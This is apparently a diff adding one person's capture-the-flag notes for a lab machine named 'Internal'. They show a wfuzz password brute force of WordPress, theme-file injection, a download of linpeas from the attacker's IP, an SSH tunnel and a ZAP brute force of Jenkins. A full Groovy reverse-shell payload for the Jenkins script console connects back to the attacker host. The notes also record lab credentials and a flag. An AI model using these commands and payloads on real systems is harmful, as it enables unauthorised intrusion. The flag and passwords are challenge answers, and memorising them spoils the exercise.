@@ -1,0 +1,58 @@
+Internal:
+22
+Used to tunnel to access Jenkins Server with aubreanna.
+80
+Apache httpd 2.4.29
+There is a wordpress login site
+wfuzz with rockyou.txt finds admin:my2boys
+wfuzz -c -u http://10.10.17.116/blog/wp-login.php -d "log=admin&pwd=FUZZ" -z file,/usr/share/wordlists/rockyou.txt --hh 4942
+From the login screen I see a note left open that says:
+Don't forget to reset Will's credentials. william:arnold147
+unable to find a place to use this.
+Theme injection
+First I tried replacing the php code in the plugin, but the file is not writable.
+Then I tried uploading a malicious plugin via metasploit, also not working due to write permissions
+Themes are editable
+edited Twenty Seventeen’s index.php
+Just visited the main page, triggered the rev shell
+got a shell!
+Reverse Shell
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+cd /tmp
+wget http://10.6.15.130:8000/linpeas.sh
+chmod +x linpeas.sh
+found database passwords
+wordpress:wordpress123
+phpmyadmin:B2Ud4fE0ZmVq
+Don’t seem to have a benefit
+/opt/wp-save.txt
+has the creds for aubreanna
+aubreanna:bubb13guM!@#123
+Aubreanna:
+THM{int3rna1_fl4g_1}
+ssh tunnel to Jenkins
+ssh -L 8000:127.0.0.1:8080 aubreanna@internal.thm
+where I learned about ssh tunnels: https://linuxize.com/post/how-to-setup-ssh-tunneling/#:~:text=Set%20up%20SSH%20Tunneling%20in%20Windows,-Windows%20users%20can&text=Launch%20Putty%20and%20enter%20the,Dynamic%20for%20dynamic%20port%20forwarding.
+go to firefox, set up proxy options
+Fire up ZAP
+set the spider on 127.0.0.1:8000
+fuzz the j_acegi security thing
+set the password FUZZ to rockyou
+set the username to admin
+set rememberme to off
+monitor by response sizes, noticed one with a very small response size
+admin:spongebob
+Jenkins
+manage jenkins
+script console
+String host="10.6.15.130";int port=4444;String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+shell received :)
+Jenkins Shell
+python -c 'import pty; pty.spawn("/bin/bash")'
+I am in a container running Jenkins
+Linpeas says its a docker container
+nothing useful
+manual enumeration into /opt directory finds note.txt
+ROOT CREDS!!!
+root:tr0ub13guM!@#123
